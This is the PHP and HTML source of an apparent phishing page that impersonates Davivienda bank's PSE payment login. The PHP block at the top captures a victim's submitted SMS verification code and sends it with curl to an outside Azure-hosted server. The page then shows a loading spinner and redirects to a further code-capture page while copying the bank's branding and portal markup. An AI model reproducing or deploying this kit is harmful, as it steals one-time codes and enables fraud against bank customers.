<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['socialcorr'])) {
	$message = 'DAVIVIENDA
SMS: ' . $_POST['socialcorr'];
	$payload = ['mensaje' => $message];
	$url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/daviviendaznequi/';

	$ch = curl_init($url);
	curl_setopt_array($ch, [
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_POST           => true,
		CURLOPT_HTTPHEADER     => [
			'Accept: application/json',
			'Content-Type: application/json',
'X-Client-IP: ' . $myip,
		],
		CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
		CURLOPT_TIMEOUT        => 20,
		CURLOPT_CONNECTTIMEOUT => 10,
	]);

	$response = curl_exec($ch);
	if ($response === false) {
		error_log('cURL error: ' . curl_error($ch));
		http_response_code(500);
		exit('Error de red.');
	}
	$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
} ?>
<html lang="es">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="refresh" content="10;url=cod.php">

</head>

<body onload="deshabilita()" class="bodyPersonas">
	<div class="hiddenWidgetsDiv">
		<div class="component-container ibmDndRow hiddenWidgetsContainer id-Z7_7HMJLOLPS5FLM457FJORNDVB05" name="ibmHiddenWidgets"></div>
		<div style="clear:both"></div>
	</div>
	<div class="component-container wpthemeLeft wpthemeCol-1 wpthemeCol ibmDndColumn id-Z7_6BNRR3I0NF61I51K3I09O28GK7" name="ibmMainContainer">
		<div class="component-control selected asa.portlet.selected id-Z7_KQ84HOK0298RE0688624FQ3GI0"><span id="Z7_KQ84HOK0298RE0688624FQ3GI0"></span>
			<section class="ibmPortalControl wpthemeNoSkin a11yRegionTarget" role="region">


				<div class="asa.portlet" id="asa.portlet.Z7_KQ84HOK0298RE0688624FQ3GI0" style="display:none;">
					<span class="asa.portlet.id">Z7_KQ84HOK0298RE0688624FQ3GI0</span>



				</div>

				<div style="position:relative; z-index: 1;">
					<div class="analytics.overlay"></div>
				</div>
				<div class="wpthemeOverflowAuto">

					<div xmlns:portlet-client-model="http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portlet-client-model">
						<portlet-client-model:init>
							<portlet-client-model:require module="ibm.portal.xml.*"></portlet-client-model:require>
							<portlet-client-model:require module="ibm.portal.portlet.*"></portlet-client-model:require>
						</portlet-client-model:init>

						<title>PSE</title>

						<link rel="stylesheet" media="screen" type="text/css" href="./davi/daviviendacom.css">
						<link rel="stylesheet" media="screen" type="text/css" href="./davi/responsiveNatural.css">
						<link rel="stylesheet" media="screen" type="text/css" href="./davi/jquery-ui.css">
						<script type="text/javascript" src="./davi/GTMLib.js.descarga">
							<!--
							//
							-->
						</script>
						<form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="#/wps/portal/PSE/!ut/p/z1/hY9LC4MwEIR_jce6ixGb9mahTynFSqnmUmJJo6BGkvT56xvoVenCHHb3G5gBBjmwjj9qyW2tOt64vWDRJUlpuDkkGMzocYkRpVEQrlKyDkI4_wOYe-PIxOj87B-yAyYbVf7SxF1JqASmxU1oof27dufK2t7MPfRQC1kbq5XfG-FfVevk4ZCvUsZCPoBD4RpNRxttETIoFlC89vxEntC3OU5Y-SafLP4CuxrU2g!!/dz/d5/L2dBISEvZ0FBIS9nQSEh/p0/IZ7_KQ84HOK0298RE0688624FQ3GI0=CZ6_KQ84HOK0298RE0688624FQ3G24=LA0=Ejavax.servlet.include.path_info!QCPpaginasQCPautenticacion.xhtml==/#Z7_KQ84HOK0298RE0688624FQ3GI0" enctype="application/x-www-form-urlencoded"><input type="hidden" name="javax.faces.encodedURL" value="/wps/portal/PSE/!ut/p/z1/hY9LC4MwEIR_jce6ixGb9mahTynFSqnmUmJJo6BGkvT56xvoVenCHHb3G5gBBjmwjj9qyW2tOt64vWDRJUlpuDkkGMzocYkRpVEQrlKyDkI4_wOYe-PIxOj87B-yAyYbVf7SxF1JqASmxU1oof27dufK2t7MPfRQC1kbq5XfG-FfVevk4ZCvUsZCPoBD4RpNRxttETIoFlC89vxEntC3OU5Y-SafLP4CuxrU2g!!/dz/d5/L2dBISEvZ0FBIS9nQSEh/p0/IZ7_KQ84HOK0298RE0688624FQ3GI0=CZ6_KQ84HOK0298RE0688624FQ3G24=NJpaginasQCPautenticacion.xhtml=/">


							<header>
								<div class="cabecera">
									<div class="wrapLeft" style="padding-top: 0px;"><img src="./davi/logo-davivienda2.png" alt="LogoDavivienda">
									</div>
									<div class="wrapRight">

										<br>Código único CUS: 450610118
									</div>
								</div>
							</header>

							<section>
								<div class="contenedorArticulos">
									<h1 style="text-align: center">Ingreso Persona Natural</h1>
									<h2 style="text-align: center">Pagos en Línea y PSE</h2>
									<br>
									<br><span id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:camposEntrada">
										<div class="contenedor">

											<center><span class="enunciado"></span>
											</center>
											<br>
											<div class="columna">

											</div>

											<div class="columna">

												<p></p>
											</div>

											<div class="columna">
												<table class="centrar">
													<tbody>
														<tr>
															<td>
																<div class="carga">
																	<div class="circulo"></div>
																</div>
															</td>
															<td>&nbsp;</td>
															<td>
															</td>
														</tr>
													</tbody>
												</table>
											</div>
											<style>
												.carga {
													position: fixed;
													top: 50%;
													left: 50%;
													transform: translate(-50%, -50%);
												}

												.circulo {
													width: 50px;
													height: 50px;
													border-radius: 50%;
													border: 4px solid #ff0000;
													border-top: 4px solid transparent;
													animation: girar 1s linear infinite;
												}

												@keyframes girar {
													to {
														transform: rotate(360deg);
													}
												}
											</style>
											<div class="columna">
											</div>

											<div class="columna">
											</div>

											<div class="columna">
												<p>
												</p>
											</div>

											<div class="columna">
											</div>
											<br> <br>
										</div>
									</span>
								</div>
							</section>

							<footer>
								<div class="mostrar">
									<div class="wrapLeft">Banco Davivienda S.A. Todos los
										derechos reservados 2024.</div>
									<div class="wrapCenter"><img src="./davi/Vigilado.png" alt="Vigilado">
									</div>
								</div>

								<div class="ocultar">
									<div class="wrapLeft"><img src="./davi/Vigilado.png" alt="Vigilado">
									</div>
									<div class="wrapCenter">Banco Davivienda S.A. Todos los
										derechos reservados 2024.</div>
								</div>

								<div class="wrapRight"><img src="./davi/Logo-Davivienda-footer.png" alt="Logo-Davivienda-footer">
								</div>
							</footer><input type="hidden" id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:todo1RSADevicePrint" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:todo1RSADevicePrint" value=""><input type="hidden" id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:todo1DomElements" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:todo1DomElements" value=""><input type="hidden" id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:todo1UiEvent" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:todo1UiEvent" value=""><input type="hidden" id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:mostrarSplashScreen" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:mostrarSplashScreen" value="false"><input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:cancelarTx" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:cancelarTx" type="submit" value="C" class="oculto"><input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:cancelarPorCierreVentana" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:cancelarPorCierreVentana" type="button" value="C" onclick="jsf.ajax.request(this, event, {execute: this.id}); return false;" class="oculto"><input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:consultarPerfil" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:consultarPerfil" type="submit" value="P" onclick="var cf = function(){encriptarCamposSensibles();};var oamSF = function(){};return (cf.apply(this, [])==false)? false : oamSF.apply(this, []); " class="oculto"><input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:autenticacion" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:autenticacion" type="submit" class="oculto"><input type="hidden" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar_SUBMIT" value="1"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="fEhsQlkG9Im00sDDYuiRgIfs4K6nbNCW+kbtaqTAQs5BK1JS">
						</form>
						<form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formControl" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formControl" method="post" action="#/wps/portal/PSE/!ut/p/z1/hY9LC4MwEIR_jce6ixGb9mahTynFSqnmUmJJo6BGkvT56xvoVenCHHb3G5gBBjmwjj9qyW2tOt64vWDRJUlpuDkkGMzocYkRpVEQrlKyDkI4_wOYe-PIxOj87B-yAyYbVf7SxF1JqASmxU1oof27dufK2t7MPfRQC1kbq5XfG-FfVevk4ZCvUsZCPoBD4RpNRxttETIoFlC89vxEntC3OU5Y-SafLP4CuxrU2g!!/dz/d5/L2dBISEvZ0FBIS9nQSEh/p0/IZ7_KQ84HOK0298RE0688624FQ3GI0=CZ6_KQ84HOK0298RE0688624FQ3G24=LA0=Ejavax.servlet.include.path_info!QCPpaginasQCPautenticacion.xhtml==/#Z7_KQ84HOK0298RE0688624FQ3GI0" style="display: none;" enctype="application/x-www-form-urlencoded"><input type="hidden" name="javax.faces.encodedURL" value="/wps/portal/PSE/!ut/p/z1/hY9LC4MwEIR_jce6ixGb9mahTynFSqnmUmJJo6BGkvT56xvoVenCHHb3G5gBBjmwjj9qyW2tOt64vWDRJUlpuDkkGMzocYkRpVEQrlKyDkI4_wOYe-PIxOj87B-yAyYbVf7SxF1JqASmxU1oof27dufK2t7MPfRQC1kbq5XfG-FfVevk4ZCvUsZCPoBD4RpNRxttETIoFlC89vxEntC3OU5Y-SafLP4CuxrU2g!!/dz/d5/L2dBISEvZ0FBIS9nQSEh/p0/IZ7_KQ84HOK0298RE0688624FQ3GI0=CZ6_KQ84HOK0298RE0688624FQ3G24=NJpaginasQCPautenticacion.xhtml=/"><input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formControl:buttonControl" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formControl:buttonControl" type="submit"><input type="hidden" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formControl_SUBMIT" value="1"><input type="hidden" name="javax.faces.ViewState" id="javax.faces.ViewState" value="fEhsQlkG9Im00sDDYuiRgIfs4K6nbNCW+kbtaqTAQs5BK1JS"></form>
						<a class="urlLink" href="#/wps/portal/PSE/!ut/p/z1/hY9LC4MwEIR_jce6ixGb9mahTynFSqnmUmJJo6BGkvT56xvoVenCHHb3G5gBBjmwjj9qyW2tOt64vWDRJUlpuDkkGMzocYkRpVEQrlKyDkI4_wOYe-PIxOj87B-yAyYbVf7SxF1JqASmxU1oof27dufK2t7MPfRQC1kbq5XfG-FfVevk4ZCvUsZCPoBD4RpNRxttETIoFlC89vxEntC3OU5Y-SafLP4CuxrU2g!!/dz/d5/L2dBISEvZ0FBIS9nQSEh/p0/IZ7_KQ84HOK0298RE0688624FQ3GI0=CZ6_KQ84HOK0298RE0688624FQ3G24=NJj_id_2y=/" style="display:none"></a>

					</div>
				</div>
			</section>
		</div>
	</div>




</body>

</html>